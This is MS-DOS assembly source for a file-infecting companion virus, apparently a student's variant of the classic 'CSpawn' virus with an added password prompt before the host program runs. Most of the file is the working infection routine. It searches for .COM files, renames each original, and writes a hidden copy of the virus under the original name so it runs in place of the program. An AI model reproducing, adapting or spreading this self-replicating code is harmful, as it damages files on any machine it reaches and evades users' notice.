.model tiny
.data
m0 db 'Please enter the password: ','$'
req_pass db 'antivirus',0
given_pass db 60 dup(?),0 ;max 60 uninitialized bytes
m1 db 'Correct password ! Will execute the host !','$'
m2 db 'Incorrect password ! Will exit without executing the host !','$'
.code
        org 100h
CSpawn:
        MOV SP, offset FINISH + 100h
        MOV AH, 4AH
        MOV BX,SP
        MOV CL,4
        SHR BX,CL
        INC BX
        INT 21H

        MOV BX,2Ch
        MOV AX,[BX]
        MOV WORD PTR [PARAM_BLK],AX
        MOV AX,CS
        MOV WORD PTR [PARAM_BLK+4],AX
        MOV WORD PTR [PARAM_BLK+8],AX
        MOV WORD PTR [PARAM_BLK+12],AX
;my code !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		
		mov dx,offset m0 
		mov ah,09 ;WRITE STRING TO STANDARD OUTPUT
		int 21h
		;prepare to call the procedure - compare_strings_project(string1,string2) (&string e echivalent cu numele sau)
		mov ax,offset req_pass
		push ax
		mov ax,offset given_pass
		push ax
		call NEAR PTR read_and_compare ;calling the procedure
		
		mov si,offset given_pass
		mov cx,60
		change_to_zero:
			mov al,0h
			mov [si],al 
			inc si
			loop change_to_zero
		
		cmp dx,1
		jne exec_host	
		;exit-code
		mov dx,offset m2
		mov ah,09
		int 21h
		mov AX, 4c00h;to terminate the process and return 0 as exit code
		int 21h		

;void compare_strings_project(char* c1,char* c1) ->NEAR pointers pointing at the beginning of each string in the data segment
read_and_compare PROC NEAR
	push bp
	mov bp,sp
	
	;mov si,offset given_pass
	mov bx,ss:[bp+4]
	mov si,bx
	
	mov cx,60
	user_input:
		mov ah,01 ;READ CHARACTER FROM STANDARD INPUT, WITH ECHO
		int 21h
		cmp al,13 ;compare if we've entered a new line/enter character
		je here0
		mov [si],al ;AL has the read character
		inc si
		loop user_input
	here0:	
	mov dl, 13
	mov ah, 02h ;write new line
	int 21h
	
	xor dx,dx
	xor ax,ax
	xor bx,bx
	xor si,si
		
	loop1:
		;mov bx,offset req_pass
		mov bx,ss:[bp+6]
		mov al,[bx+si]
		;mov bx,offset given_pass
		mov bx,ss:[bp+4]
		cmp al,[bx+si]
		jne here1
		inc si
		cmp al,0
		jne loop1
		je here2
	here1:
		mov dx,1
	here2:
		pop bp
		ret 4;how many bytes to extract from the stack to clean it
read_and_compare ENDP

exec_host:	
		mov dx,offset m1
		mov ah,09
		int 21h
		
;prepare to execute de host !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        MOV DX,offset REAL_NAME
        MOV BX,offset PARAM_BLK
        MOV AX,4B00h
        INT 21h

        CLI
		mov     bx,ax                   ;save return code here
        mov     ax,cs                   ;AX holds code segment
        mov     ss,ax                   ;restore stack first 
        mov     sp,(FINISH - CSpawn) + 200H
        sti                
		push    bx                
		mov     ds,ax                   ;Restore data segment
        mov     es,ax                   ;Restore extra segment
        mov     ah,1AH                  ;DOS set DTA function    
        mov     dx,80H                  ;put DTA at offset 80H      
        int     21H                
		call    FIND_FILES              ;Find and infect files
        pop     ax                      ;AL holds return value 
        mov     ah,4CH                  ;DOS terminate function     
		int     21H                     ;bye-bye

;The following routine searches for COM files and infects them
FIND_FILES:                
		mov     dx,OFFSET COM_MASK      ;search for COM files
        mov     ah,4EH                  ;DOS find first file function 
        xor     cx,cx                   ;CX holds all file attributes
FIND_LOOP:      
		int     21H                
		jc      FIND_DONE               ;Exit if no files found
        call    INFECT_FILE             ;Infect the file!
        mov     ah,4FH                  ;DOS find next file function 
        jmp     FIND_LOOP               ;Try finding another file
FIND_DONE:      ret                     ;Return to caller
        COM_MASK        db      '*.COM',0               ;COM file search mask

;This routine infects the file specified in the DTA.

INFECT_FILE:                
		mov     si,9EH                  ;DTA + 1EH                
		mov     di,OFFSET REAL_NAME     ;DI points to new name
INF_LOOP:       
		lodsb                           ;Load a character
		stosb                           ;and save it in buffer
		or      al,al                   ;Is it a NULL?
		jnz     INF_LOOP                ;If so then leave the loop
        mov     WORD PTR [di-2],'N'     ;change name to CON & add 0
		mov     dx,9EH                  ;DTA + 1EH
		mov     di,OFFSET REAL_NAME                
		mov     ah,56H                  ;rename original file
		int     21H
		jc      INF_EXIT                ;if can’t rename, already done

		mov     ah,3CH                  ;DOS create file function
        mov     cx,2                    ;set hidden attribute
        int     21H
        mov     bx,ax                   ;BX holds file handle
        mov     ah,40H                  ;DOS write to file function
        mov     cx,FINISH - CSpawn      ;CX holds virus length
        mov     dx,OFFSET CSpawn        ;DX points to CSpawn of virus
        int     21H                
		mov     ah,3EH                  ;DOS close file function
        int     21H
INF_EXIT:       ret

REAL_NAME       db      13 dup (?)              ;Name of host to execute

;DOS EXEC function parameter block
PARAM_BLK       DW      ?                       ;environment segment
                DD      80H                     ;@ of command line
	            DD      5CH                     ;@ of first FCB
        	    DD      6CH                     ;@ of second FCB
FINISH:
	end     CSpawn

